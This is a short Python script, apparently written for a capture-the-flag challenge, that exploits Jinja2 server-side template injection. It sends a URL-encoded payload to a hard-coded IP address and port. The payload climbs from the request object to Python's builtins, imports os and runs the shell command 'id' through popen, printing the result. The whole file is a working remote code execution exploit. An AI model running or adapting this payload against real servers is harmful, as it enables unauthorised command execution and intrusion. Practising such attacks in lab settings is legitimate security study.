#!/bin/env python3
# https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

from urllib.parse import unquote, quote
from requests import get
url = "http://188.166.173.208:32553/"

print(get(url+quote("{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}")).text)
